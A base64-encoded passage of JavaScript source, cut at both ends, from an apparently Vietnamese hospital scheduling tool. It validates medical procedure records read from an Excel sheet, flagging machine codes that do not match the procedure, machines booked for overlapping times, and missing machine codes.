Jldi5wYXRpZW50TmFtZX08YnI+4oCiIE5nw6B5OiAke3ByZXYuZGF0ZX08YnI+4oCiIFRo4budaSBnaWFuOiAke3ByZXYuZGlzcGxheVN0YXJ0fS0ke3ByZXYuZGlzcGxheUVuZH1gOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJldi5jb25mbGljdCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFwcmV2LmNvbmZsaWN0UmVhc29uLmluY2x1ZGVzKGN1cnJlbnQucHJvY2VkdXJlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmV2LmNvbmZsaWN0UmVhc29uICs9IChwcmV2LmNvbmZsaWN0UmVhc29uID8gJzxicj48YnI+JyA6ICcnKSArIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYCAke2N1cnJlbnQucHJvY2VkdXJlfTxicj7igKIgQuG7h25oIG5ow6JuOiAke2N1cnJlbnQucGF0aWVudE5hbWV9PGJyPuKAoiBOZ8OgeTogJHtjdXJyZW50LmRhdGV9PGJyPuKAoiBUaOG7nWkgZ2lhbjogJHtjdXJyZW50LmRpc3BsYXlTdGFydH0tJHtjdXJyZW50LmRpc3BsYXlFbmR9YDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9KTsNCiAgICAgICAgfQ0KDQoNCi8vIEjDoG0ga2nhu4NtIHRyYSBn4bqvbiBzYWkgbcOheQ0KZnVuY3Rpb24gY2hlY2tNYWNoaW5lRXJyb3JzKHByb2NlZHVyZXMsIGpzb25EYXRhKSB7DQogICAgbWFjaGluZUVycm9yTG9nID0gW107DQogICAgDQogICAgY29uc3QgaGVhZGVyTGluZTEgPSBqc29uRGF0YVs3XSB8fCBbXTsNCiAgICBjb25zdCBoZWFkZXJMaW5lMiA9IGpzb25EYXRhWzhdIHx8IFtdOw0KICAgIGNvbnN0IGNvbWJpbmVkSGVhZGVycyA9IGhlYWRlckxpbmUxLm1hcCgoY29sLCBpbmRleCkgPT4gDQogICAgICAgIChjb2wgKyAnICcgKyAoaGVhZGVyTGluZTJbaW5kZXhdIHx8ICcnKSkudHJpbSgpDQogICAgKTsNCg0KICAgIC8vIFTDrG0gY+G7mXQgbcOjIG3DoXkNCiAgICBjb25zdCBtYWNoaW5lQ29kZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IA0KICAgICAgICBoLmluY2x1ZGVzKCJNw6MgbcOheSIpIHx8IGguaW5jbHVkZXMoIk3DoyBtw6F5IHRoZW8gdGjhu6cgdGh14bqtdCIpDQogICAgKTsNCiAgICAgLy8gVMOsbSBj4buZdCBiw6FjIHPhu7kgY2jhu4kgxJHhu4tuaA0KICAgIGNvbnN0IGRvY3RvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkLDoWMgc+G7uSBjaOG7iSDEkeG7i25oIikpOw0KICAgDQogICAgaWYgKG1hY2hpbmVDb2RlSW5kZXggPT09IC0xKSB7DQogICAgICAgIGNvbnNvbGUubG9nKCJLaMO0bmcgdMOsbSB0aOG6pXkgY+G7mXQgbcOjIG3DoXkgdHJvbmcgZmlsZSBFeGNlbCIpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgLy8gVMOsbSBjw6FjIGPhu5l0IGtow6FjIGPhuqduIHRoaeG6v3QNCiAgICBjb25zdCBwcm9jZWR1cmVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IikpOw0KICAgIGNvbnN0IG5hbWVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJI4buNIHTDqm4iKSk7DQoJY29uc3QgcGF0aWVudElkSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiTcOjIEJOIikpOw0KCWNvbnN0IHBhdGllbnRhZ2VJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUdeG7lWkiKSk7DQogICAgY29uc3Qgb3BlcmF0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IGNow61uaCIpKTsNCiAgICBjb25zdCBzdGFydEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGLhuq90IMSR4bqndSB0aOG7sWMgaGnhu4duIikpOw0KICAgIGNvbnN0IGVuZEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGvhur90IHRow7pjIikpOw0KDQogICAgY29uc3Qgcm93cyA9IGpzb25EYXRhLnNsaWNlKDkpOw0KICAgIA0KICAgIHJvd3MuZm9yRWFjaCgocm93LCBpbmRleCkgPT4gew0KICAgICAgICBjb25zdCByb3dOdW1iZXIgPSBpbmRleCArIDEwOw0KICAgICAgICANCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmICghcm93IHx8IHJvdy5sZW5ndGggPT09IDApIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlTmFtZSA9IHJvd1twcm9jZWR1cmVJbmRleF07DQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZU5hbWUgfHwgIVBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0pIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgbWFjaGluZUNvZGUgPSAocm93W21hY2hpbmVDb2RlSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKTsNCiAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZUluZm8gPSBQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBDaOG7iSBraeG7g20gdHJhIDMgdGjhu6cgdGh14bqtdCBjw7MgbWFjaGluZUNvZGUNCiAgICAgICAgICAgIGlmICghcHJvY2VkdXJlSW5mby5tYWNoaW5lQ29kZSkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBleHBlY3RlZENvZGVzID0gQXJyYXkuaXNBcnJheShwcm9jZWR1cmVJbmZvLm1hY2hpbmVDb2RlKSANCiAgICAgICAgICAgICAgICA/IHByb2NlZHVyZUluZm8ubWFjaGluZUNvZGUgDQogICAgICAgICAgICAgICAgOiBbcHJvY2VkdXJlSW5mby5tYWNoaW5lQ29kZV07DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEtp4buDbSB0cmEgeGVtIG3DoyBtw6F5IGPDsyBjaOG7qWEgYuG6pXQga+G7syBtw6MgZXhwZWN0ZWQgbsOgbyBraMO0bmcNCiAgICAgICAgICAgIGNvbnN0IGlzVmFsaWRNYWNoaW5lID0gZXhwZWN0ZWRDb2Rlcy5zb21lKGNvZGUgPT4gDQogICAgICAgICAgICAgICAgbWFjaGluZUNvZGUudG9VcHBlckNhc2UoKS5pbmNsdWRlcyhjb2RlLnRvVXBwZXJDYXNlKCkpDQogICAgICAgICAgICApOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoIWlzVmFsaWRNYWNoaW5lICYmIG1hY2hpbmVDb2RlICE9PSAnJykgew0KICAgICAgICAgICAgICAgIGNvbnN0IHN0YXJ0ID0gcGFyc2VEYXRlVGltZShyb3dbc3RhcnRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgY29uc3QgZW5kID0gcGFyc2VEYXRlVGltZShyb3dbZW5kSW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIC8vIFjDoWMgxJHhu4tuaCB0aMO0bmcgYsOhbyBs4buXaSBj4bulIHRo4buDIGThu7FhIHRyw6puIG3DoyBtw6F5IG5o4bqtcCBzYWkNCiAgICAgICAgICAgICAgICBsZXQgZXJyb3JNZXNzYWdlID0gJ0fhuq9uIG5o4bqnbSBtw6F5IGNoxrBhIHjDoWMgxJHhu4tuaCc7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKG1hY2hpbmVDb2RlLnRvVXBwZXJDYXNlKCkuaW5jbHVkZXMoJ03EkEMnKSkgew0KICAgICAgICAgICAgICAgICAgICBlcnJvck1lc3NhZ2UgPSAnR+G6r24gbmjhuqdtIG3DoXkgxJFp4buHbiBjaMOibSBy4buTaSc7DQogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChtYWNoaW5lQ29kZS50b1VwcGVyQ2FzZSgpLmluY2x1ZGVzKCfEkEhOJykpIHsNCiAgICAgICAgICAgICAgICAgICAgZXJyb3JNZXNzYWdlID0gJ0fhuq9uIG5o4bqnbSDEkcOobiBo4buTbmcgbmdv4bqhaSBy4buTaSc7DQogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChtYWNoaW5lQ29kZS50b1VwcGVyQ2FzZSgpLmluY2x1ZGVzKCdHSCcpIHx8IG1hY2hpbmVDb2RlLnRvVXBwZXJDYXNlKCkuaW5jbHVkZXMoJ09HSCcpKSB7DQogICAgICAgICAgICAgICAgICAgIGVycm9yTWVzc2FnZSA9ICdH4bqvbiBuaOG6p20gbcOheSBnacOhYyBoxqFpIHLhu5NpJzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgbWFjaGluZUVycm9yTG9nLnB1c2goew0KICAgICAgICAgICAgICAgICAgICByb3dOdW1iZXI6IHJvd051bWJlciwNCiAgICAgICAgICAgICAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgIHBhdGllbnRJZDogcGF0aWVudElkSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRJZEluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgIHBhdGllbnRBZ2U6IHBhdGllbnRhZ2VJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudGFnZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsICAgICANCgkJCQkJcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KICAgICAgICAgICAgICAgICAgICBvcGVyYXRvcjogb3BlcmF0b3JJbmRleCAhPT0gLTEgPyByb3dbb3BlcmF0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQkJCQlkb2N0b3I6IGRvY3RvckluZGV4ICE9PSAtMSA/IHJvd1tkb2N0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLCAvLyBUaMOqbSBiw6FjIHPhu7kNCiAgICAgICAgICAgICAgICAgICAgZGF0ZTogc3RhcnQ/LmRhdGVLZXkgfHwgJ0tow7RuZyB4w6FjIMSR4buLbmgnLA0KICAgICAgICAgICAgICAgICAgICBzdGFydFRpbWU6IHN0YXJ0Py5kaXNwbGF5VGltZSB8fCAnPz8nLA0KICAgICAgICAgICAgICAgICAgICBlbmRUaW1lOiBlbmQ/LmRpc3BsYXlUaW1lIHx8ICc/PycsDQogICAgICAgICAgICAgICAgICAgIG1hY2hpbmVDb2RlOiBtYWNoaW5lQ29kZSwNCiAgICAgICAgICAgICAgICAgICAgZXhwZWN0ZWRDb2RlczogZXhwZWN0ZWRDb2Rlcy5qb2luKCcgaG/hurdjICcpLA0KICAgICAgICAgICAgICAgICAgICBtZXNzYWdlOiBlcnJvck1lc3NhZ2UgLy8gU+G7rSBk4bulbmcgdGjDtG5nIGLDoW8gY+G7pSB0aOG7gw0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcihgTOG7l2kga2nhu4NtIHRyYSBtw6F5IGTDsm5nICR7cm93TnVtYmVyfTpgLCBlcnJvcik7DQogICAgICAgIH0NCiAgICB9KTsNCn0NCg0KLy8gSMOgbSBraeG7g20gdHJhIHh1bmcgxJHhu5l0IG3DoXkNCmZ1bmN0aW9uIGNoZWNrTWFjaGluZUNvbmZsaWN0cyhwcm9jZWR1cmVzLCBqc29uRGF0YSkgew0KICAgIG1hY2hpbmVDb25mbGljdExvZyA9IFtdOw0KICAgIA0KICAgIGNvbnN0IGhlYWRlckxpbmUxID0ganNvbkRhdGFbN10gfHwgW107DQogICAgY29uc3QgaGVhZGVyTGluZTIgPSBqc29uRGF0YVs4XSB8fCBbXTsNCiAgICBjb25zdCBjb21iaW5lZEhlYWRlcnMgPSBoZWFkZXJMaW5lMS5tYXAoKGNvbCwgaW5kZXgpID0+IA0KICAgICAgICAoY29sICsgJyAnICsgKGhlYWRlckxpbmUyW2luZGV4XSB8fCAnJykpLnRyaW0oKQ0KICAgICk7DQoNCiAgICAvLyBUw6xtIGPhu5l0IG3DoyBtw6F5DQogICAgY29uc3QgbWFjaGluZUNvZGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiANCiAgICAgICAgaC5pbmNsdWRlcygiTcOjIG3DoXkiKSB8fCBoLmluY2x1ZGVzKCJNw6MgbcOheSB0aGVvIHRo4bunIHRodeG6rXQiKQ0KICAgICk7DQogICAgIC8vIFTDrG0gY+G7mXQgYsOhYyBz4bu5IGNo4buJIMSR4buLbmgNCiAgICBjb25zdCBkb2N0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaCIpKTsNCiAgICANCiAgICBpZiAobWFjaGluZUNvZGVJbmRleCA9PT0gLTEpIHsNCiAgICAgICAgY29uc29sZS5sb2coIktow7RuZyB0w6xtIHRo4bqleSBj4buZdCBtw6MgbcOheSIpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgY29uc3Qgcm93cyA9IGpzb25EYXRhLnNsaWNlKDkpOw0KICAgIGNvbnN0IG1hY2hpbmVQcm9jZWR1cmVzID0gW107DQogICAgDQogICAgLy8gTOG7jWMgY8OhYyB0aOG7pyB0aHXhuq10IGPDsyBz4butIGThu6VuZyBtw6F5DQogICAgcm93cy5mb3JFYWNoKChyb3csIGluZGV4KSA9PiB7DQogICAgICAgIGNvbnN0IHJvd051bWJlciA9IGluZGV4ICsgMTA7DQogICAgICAgIA0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKCFyb3cgfHwgcm93Lmxlbmd0aCA9PT0gMCkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVOYW1lID0gcm93W2NvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IikpXTsNCiAgICAgICAgICAgIGlmICghcHJvY2VkdXJlTmFtZSB8fCAhUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXSkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVJbmZvID0gUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXTsNCiAgICAgICAgICAgIGlmICghcHJvY2VkdXJlSW5mby5tYWNoaW5lQ29kZSkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBtYWNoaW5lQ29kZSA9IChyb3dbbWFjaGluZUNvZGVJbmRleF0gfHwgJycpLnRvU3RyaW5nKCkudHJpbSgpOw0KICAgICAgICAgICAgaWYgKCFtYWNoaW5lQ29kZSkgcmV0dXJuOw0KICAgICANCiAgICAgICAgICAgIGNvbnN0IG5hbWVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJI4buNIHTDqm4iKSk7DQoJCSAgICBjb25zdCBwYXRpZW50SWRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJNw6MgQk4iKSk7DQoJCQljb25zdCBwYXRpZW50YWdlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVHXhu5VpIikpOw0KICAgICAgICAgICAgY29uc3Qgb3BlcmF0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IGNow61uaCIpKTsNCiAgICAgICAgICAgIGNvbnN0IHN0YXJ0SW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IHRo4buxYyBoaeG7h24iKSk7DQogICAgICAgICAgICBjb25zdCBlbmRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7nWkgZ2lhbiBr4bq/dCB0aMO6YyIpKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3Qgc3RhcnQgPSBwYXJzZURhdGVUaW1lKHJvd1tzdGFydEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgIGNvbnN0IGVuZCA9IHBhcnNlRGF0ZVRpbWUocm93W2VuZEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKHN0YXJ0ICYmIGVuZCkgew0KICAgICAgICAgICAgICAgIG1hY2hpbmVQcm9jZWR1cmVzLnB1c2goew0KICAgICAgICAgICAgICAgICAgICByb3dOdW1iZXI6IHJvd051bWJlciwNCiAgICAgICAgICAgICAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQoJCQkJCXBhdGllbnRJZDogcGF0aWVudElkSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRJZEluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQoJCQkJCXBhdGllbnRBZ2U6IHBhdGllbnRhZ2VJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudGFnZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgICAgICAgICAgICAgb3BlcmF0b3I6IG9wZXJhdG9ySW5kZXggIT09IC0xID8gcm93W29wZXJhdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJCQkJZG9jdG9yOiBkb2N0b3JJbmRleCAhPT0gLTEgPyByb3dbZG9jdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywgLy8gVGjDqm0gYsOhYyBz4bu5DQogICAgICAgICAgICAgICAgICAgIGRhdGU6IHN0YXJ0LmRhdGVLZXksDQogICAgICAgICAgICAgICAgICAgIHN0YXJ0OiBzdGFydC5zZWNvbmRzLA0KICAgICAgICAgICAgICAgICAgICBlbmQ6IGVuZC5zZWNvbmRzLA0KICAgICAgICAgICAgICAgICAgICBkaXNwbGF5U3RhcnQ6IHN0YXJ0LmRpc3BsYXlUaW1lLA0KICAgICAgICAgICAgICAgICAgICBkaXNwbGF5RW5kOiBlbmQuZGlzcGxheVRpbWUsDQogICAgICAgICAgICAgICAgICAgIG1hY2hpbmVDb2RlOiBtYWNoaW5lQ29kZSwNCiAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlSW5mbzogcHJvY2VkdXJlSW5mbw0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcihgTOG7l2kgeOG7rSBsw70gbcOheSBkw7JuZyAke3Jvd051bWJlcn06YCwgZXJyb3IpOw0KICAgICAgICB9DQogICAgfSk7DQogICAgDQogICAgLy8gS2nhu4NtIHRyYSB4dW5nIMSR4buZdCB0aGVvIHThu6tuZyBtw6F5IFbDgCB04burbmcgbmfDoHkNCiAgICBjb25zdCBtYWNoaW5lR3JvdXBzID0ge307DQogICAgDQogICAgbWFjaGluZVByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgY29uc3Qga2V5ID0gYCR7cHJvYy5tYWNoaW5lQ29kZX1fJHtwcm9jLmRhdGV9YDsgLy8gS+G6v3QgaOG7o3AgbcOjIG3DoXkgKyBuZ8OgeQ0KICAgICAgICBpZiAoIW1hY2hpbmVHcm91cHNba2V5XSkgew0KICAgICAgICAgICAgbWFjaGluZUdyb3Vwc1trZXldID0gW107DQogICAgICAgIH0NCiAgICAgICAgbWFjaGluZUdyb3Vwc1trZXldLnB1c2gocHJvYyk7DQogICAgfSk7DQogICAgDQogICAgT2JqZWN0LnZhbHVlcyhtYWNoaW5lR3JvdXBzKS5mb3JFYWNoKHByb2NlZHVyZXMgPT4gew0KICAgICAgICBpZiAocHJvY2VkdXJlcy5sZW5ndGggPCAyKSByZXR1cm47DQogICAgICAgIA0KICAgICAgICBwcm9jZWR1cmVzLnNvcnQoKGEsIGIpID0+IGEuc3RhcnQgLSBiLnN0YXJ0KTsNCiAgICAgICAgDQogICAgICAgIGZvciAobGV0IGkgPSAxOyBpIDwgcHJvY2VkdXJlcy5sZW5ndGg7IGkrKykgew0KICAgICAgICAgICAgY29uc3QgcHJldiA9IHByb2NlZHVyZXNbaSAtIDFdOw0KICAgICAgICAgICAgY29uc3QgY3VycmVudCA9IHByb2NlZHVyZXNbaV07DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEtp4buDbSB0cmEgeGVtIGPDsyB4dW5nIMSR4buZdCB0aOG7nWkgZ2lhbiBraMO0bmcNCiAgICAgICAgICAgIGlmIChjdXJyZW50LnN0YXJ0IDwgcHJldi5lbmQpIHsNCiAgICAgICAgICAgICAgICBtYWNoaW5lQ29uZmxpY3RMb2cucHVzaCh7DQogICAgICAgICAgICAgICAgICAgIG1hY2hpbmVDb2RlOiBwcmV2Lm1hY2hpbmVDb2RlLA0KICAgICAgICAgICAgICAgICAgICBkYXRlOiBwcmV2LmRhdGUsIC8vIFRow6ptIG5nw6B5IMSR4buDIGhp4buDbiB0aOG7iw0KICAgICAgICAgICAgICAgICAgICBjb25mbGljdFByb2NlZHVyZXM6IFtwcmV2LCBjdXJyZW50XSwNCiAgICAgICAgICAgICAgICAgICAgbWVzc2FnZTogYE3DoXkgJHtwcmV2Lm1hY2hpbmVDb2RlfSDEkcaw4bujYyBz4butIGThu6VuZyDEkeG7k25nIHRo4budaSBjaG8gbmhp4buBdSBi4buHbmggbmjDom4gdHJvbmcgbmfDoHkgJHtwcmV2LmRhdGV9YA0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSk7DQp9DQpmdW5jdGlvbiBjaGVja01pc3NpbmdNYWNoaW5lQ29kZXMocHJvY2VkdXJlcywganNvbkRhdGEpIHsNCiAgICBtaXNzaW5nTWFjaGluZUxvZyA9IFtdOw0KICAgIA0KICAgIGNvbnN0IGhlYWRlckxpbmUxID0ganNvbkRhdGFbN10gfHwgW107DQogICAgY29uc3QgaGVhZGVyTGluZTIgPSBqc29uRGF0YVs4XSB8fCBbXTsNCiAgICBjb25zdCBjb21iaW5lZEhlYWRlcnMgPSBoZWFkZXJMaW5lMS5tYXAoKGNvbCwgaW5kZXgpID0+IA0KICAgICAgICAoY29sICsgJyAnICsgKGhlYWRlckxpbmUyW2luZGV4XSB8fCAnJykpLnRyaW0oKQ0KICAgICk7DQoNCiAgICAvLyBUw6xtIGPhu5l0IG3DoyBtw6F5DQogICAgY29uc3QgbWFjaGluZUNvZGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiANCiAgICAgICAgaC5pbmNsdWRlcygiTcOjIG3DoXkiKSB8fCBoLmluY2x1ZGVzKCJNw6MgbcOheSB0aGVvIHRo4bunIHRodeG6rXQiKQ0KICAgICk7DQogICAgICAvLyBUw6xtIGPhu5l0IGLDoWMgc+G7uSBjaOG7iSDEkeG7i25oDQogICAgY29uc3QgZG9jdG9ySW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiQsOhYyBz4bu5IGNo4buJIMSR4buLbmgiKSk7DQoNCiAgICBpZiAobWFjaGluZUNvZGVJbmRleCA9PT0gLTEpIHsNCiAgICAgICAgY29uc29sZS5sb2coIktow7RuZyB0w6xtIHRo4bqleSBj4buZdCBtw6MgbcOheSB0cm9uZyBmaWxlIEV4Y2VsIik7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICAvLyBUw6xtIGPDoWMgY+G7mXQga2jDoWMgY+G6p24gdGhp4bq/dA0KICAgIGNvbnN0IHByb2NlZHVyZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4bunIHRodeG6rXQiKSk7DQogICAgY29uc3QgbmFtZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkjhu40gdMOqbiIpKTsNCgljb25zdCBwYXRpZW50SWRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJNw6MgQk4iKSk7DQoJY29uc3QgcGF0aWVudGFnZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlR14buVaSIpKTsNCiAgICBjb25zdCBvcGVyYXRvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4bunIHRodeG6rXQgY2jDrW5oIikpOw0KICAgIGNvbnN0IHN0YXJ0SW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IHRo4buxYyBoaeG7h24iKSk7DQogICAgY29uc3QgZW5kSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu51pIGdpYW4ga+G6v3QgdGjDumMiKSk7DQogICAgY29uc3QgZGF0ZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIk5nw6B5IHRo4buxYyBoaeG7h24iKSk7DQoNCiAgICBjb25zdCByb3dzID0ganNvbkRhdGEuc2xpY2UoOSk7DQogICAgDQogICAgLy8gRGFuaCBzw6FjaCB0aOG7pyB0aHXhuq10IGPhuqduIGtp4buDbSB0cmEgbcOjIG3DoXkNCiAgICBjb25zdCBwcm9jZWR1cmVzVG9DaGVjayA9IFsNCiAgICAgICAgIsSRaeG7h24gY2jDom0gW2tpbSBuZ+G6r25dIiwNCiAgICAgICAgIsSRaeG7gXUgdHLhu4sgYuG6sW5nIHRpYSBo4buTbmcgbmdv4bqhaSIsIA0KICAgICAgICAiZ2nDoWMgaMahaSINCiAgICBdOw0KICAgIA0KICAgIHJvd3MuZm9yRWFjaCgocm93LCBpbmRleCkgPT4gew0KICAgICAgICBjb25zdCByb3dOdW1iZXIgPSBpbmRleCArIDEwOw0KICAgICAgICANCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmICghcm93IHx8IHJvdy5sZW5ndGggPT09IDApIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlTmFtZSA9IChyb3dbcHJvY2VkdXJlSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKTsNCiAgICAgICAgICAgIGlmICghcHJvY2VkdXJlTmFtZSkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBLaeG7g20gdHJhIHhlbSB0aOG7pyB0aHXhuq10IGPDsyB0cm9uZyBkYW5oIHPDoWNoIGPhuqduIGtp4buDbSB0cmEga2jDtG5nDQogICAgICAgICAgICBjb25zdCBzaG91bGRDaGVjayA9IHByb2NlZHVyZXNUb0NoZWNrLnNvbWUocHJvYyA9PiANCiAgICAgICAgICAgICAgICBwcm9jZWR1cmVOYW1lLnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMocHJvYy50b0xvd2VyQ2FzZSgpKQ0KICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKCFzaG91bGRDaGVjaykgcmV0dXJuOw0KICAgICAgICAgICAgDQ